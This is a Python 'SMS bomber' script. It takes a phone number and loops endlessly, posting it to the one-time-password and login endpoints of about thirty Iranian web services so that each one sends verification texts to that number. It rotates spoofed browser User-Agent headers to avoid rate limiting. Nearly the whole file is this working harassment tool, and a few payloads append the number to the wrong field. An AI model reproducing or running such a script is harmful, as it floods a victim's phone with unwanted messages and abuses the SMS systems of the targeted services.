import requests
import random
import time


print("SMS_BOMBER")
number = input("Inter your phone number (without 0) : ")
url_divar= "https://api.divar.ir/v5/auth/authenticate"
json_divar= {"phone":number}

url_snapp= "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp= {"cellphone":"+98" + number}

url_sf= "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=4a2dcc5a-4b65-4b72-a3ab-c6cdcc6e1737&locale=fa"
json_sf= {"cellphone":"0" + number}

url_sh= "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sh= {"username":"0" + number}

url_alibaba= "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba= {"phoneNumber":"+98" + number}

url_cinma= "https://cinematicket.org/api/v1/users/signup"
json_cinma= {"phone_number":"98" + number}

url_digikala= "https://api.digikala.com/v1/user/authenticate/"
json_digikala= {"backUrl":"/","username":"0" + number}

url_jet= "https://api.digikalajet.ir/user/login-register/"
json_jet= {"phone":"0" + number}

url_virgool= "https://virgool.io/api/v1.4/auth/verify"
json_virgool= {"method":"phone","identifier":"+98" + number}

url_aparat= "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage"
json_aparat= {"temp_id":"474674","account":"0","codepass_type":"otp","guid":"3433103F-9DE0-6E66-5829-B02DFE66EEF0" + number}

url_telewebion= "https://auth.telewebion.com/user/authenticate"
json_telewebion= {"field":"+98","type":"mobile" + number}

url_sb= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
json_sb= {"phoneNumber":"0" + number}

url_tpsi= "https://api.tapsi.cab/api/v2/user"
json_tpsi= {"credential":{"phoneNumber":"0","role":"PASSENGER" + number}}

url_tim = "https://api.timcheh.com/auth/otp/send"
json_tim = {"mobile":"0" + number}

url_of = "https://www.offdecor.com/index.php?route=account/login/sendCode"
json_of = {"phone":"0" + number}

url_tn = "https://tantak.ir/signup/check_phone"
json_tn = {"mobile":"0" + number}

url_bazaar = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
json_bazaar = {"properties":{"language":2,"clientID":"hajzgbx42chvzhimf2e90scice1w1rnk","deviceID":"hajzgbx42chvzhimf2e90scice1w1rnk","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":"+98" + number}}}

url_dig = "https://apitwo.digitoon.ir/mobile_login_step1/8?dg_id=5FBFC23A"
json_dig = {"mobile":"0" + number,"device_id":"desktop","device_model":"Firefox","device_os":"angularJS"}

url_kk = "https://dashboard-api.accessban.com/v1/auth/init"
json_kk = {"mobile":"0" + number}

url_mrg = "https://mrghasab.com/administrator/SMS/SendVerificationSMS.php?Site=0&Source=Account&PhoneNumber=0" + number

url_ba = "https://auth.basalam.com/otp-request"
json_ba = {"mobile":"0" + number,"client_id":11}

url_mod = "https://mobapi.banimode.com/api/v2/auth/request"
json_mod = {"phone":"0" + number}

url_reg = "https://drdr.ir/api/registerEnrollment/verifyMobile"
json_reg = {"phoneNumber":"0" + number,"userType":"PATIENT"}

url_doc = "https://api.doctoreto.com/api/web/patient/v1/accounts/register"
json_doc = {"mobile":"" + number,"country_id":205}

url_gap = "https://core.gapfilm.ir/api/v3.1/Account/Login"
json_gap = {"Type":3,"Username":"" + number,"SourceChannel":"GF_WebSite","SourcePlatform":"desktop","SourcePlatformAgentType":"Firefox","SourcePlatformVersion":"104.0"}

url_it = "https://app.itoll.ir/api/v1/auth/login"
json_it = {"mobile":"0" + number}

url_taa = "https://gw.taaghche.com/v4/site/auth/login"
json_taa = {"contact":"0" + number,"forceOtp":"false"}

url_ll = "https://dayanshop.com/Auth/CheckPhoneNumber"
json_ll = {"phoneNumber":"0" + number,"AuthenticationMode":"1"}

url_tap = "https://api.tapsi.cab/api/v2.2/user"
json_tap = {"credential":{"phoneNumber":"0" + number,"role":"PASSENGER"},"otpOption":"SMS"}

url_fan =  "https://apollo.digify.shop/graphql"
json_fan = {"operationName":"Mutation","variables":{"content":{"phone_number":"0" + number}},"query":"mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}"}

url_mar = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0" + number

url_gol = "https://www.golsetan.com/wp-json/panel/v1/auth/sendMobileAuth"
json_gol = {"phoneNumber":"0" + number}

heads = [

{
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },

]


while True:
    random_head = random.choice(heads)

    req = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print('SMS-BOMBER')

    req1 = requests.post(url= url_snapp,json=json_snapp,headers=random_head)
    print('SMS-BOMBER')

    req2 = requests.post(url= url_sf,json=json_sf,headers=random_head)
    print('SMS-BOMBER')

    req3 = requests.post(url= url_sh,json=json_sh,headers=random_head)
    print('SMS-BOMBER')

    req4 = requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)
    print('SMS-BOMBER')

    req5 = requests.post(url= url_cinma,json=json_cinma,headers=random_head)
    print('SMS-BOMBER')

    req6 = requests.post(url= url_digikala,json=json_digikala,headers=random_head)
    print('SMS-BOMBER')

    req7 = requests.post(url= url_jet,json=json_jet,headers=random_head)
    print('SMS-BOMBER')

    req8 = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
    print('SMS-BOMBER')

    req9 = requests.post(url= url_aparat,json=json_aparat,headers=random_head)
    print('SMS-BOMBER')

    req10 = requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)
    print('SMS-BOMBER')

    req11 = requests.post(url= url_sb,json=json_sb,headers=random_head)
    print('SMS-BOMBER') 

    req12 = requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)
    print('SMS-BOMBER')
    
    req13 = requests.post(url= url_tim,json=json_tim,headers=random_head)
    print('SMS-BOMBER')

    req14 = requests.post(url= url_of,json=json_of,headers=random_head)
    print('SMS-BOMBER')

    req15 = requests.post(url=url_tn,json=json_tn,headers=random_head) 
    print('SMS-BOMBER')
  
    req16 = requests.post(url=url_bazaar,json=json_bazaar,headers=random_head) 
    print('SMS-BOMBER')

    req17 = requests.post(url=url_dig,json=json_dig,headers=random_head) 
    print('SMS-BOMBER')

    req18 = requests.post(url=url_kk,json=json_kk,headers=random_head) 
    print('SMS-BOMBER')

    req19 = requests.post(url=url_mrg,headers=random_head) 
    print('SMS-BOMBER')

    req20 = requests.post(url=url_ba,json=json_ba,headers=random_head) 
    print('SMS-BOMBER')

    req21 = requests.post(url=url_mod,json=json_mod,headers=random_head) 
    print('SMS-BOMBER')
     
    req22 = requests.post(url=url_reg,json=json_reg,headers=random_head) 
    print('SMS-BOMBER')
    
    req23 = requests.post(url=url_doc,json=json_doc,headers=random_head) 
    print('SMS-BOMBER')

    req24 = requests.post(url=url_gap,json=json_gap,headers=random_head) 
    print('SMS-BOMBER')

    req25 = requests.post(url=url_it,json=json_it,headers=random_head) 
    print('SMS-BOMBER')

    req26 = requests.post(url=url_taa,json=json_taa,headers=random_head) 
    print('SMS-BOMBER')

    req27 = requests.post(url=url_ll,json=json_ll,headers=random_head) 
    print('SMS-BOMBER')

    req28 = requests.post(url=url_tap,json=json_tap,headers=random_head) 
    print('SMS-BOMBER')

    req29 = requests.post(url=url_fan,json=json_fan,headers=random_head) 
    print('SMS-BOMBER')

    req30 = requests.post(url=url_mar,headers=random_head) 
    print('SMS-BOMBER')

    req31 = requests.post(url=url_gol,json=json_gol,headers=random_head) 
    print('SMS-BOMBER')

    time.sleep(1)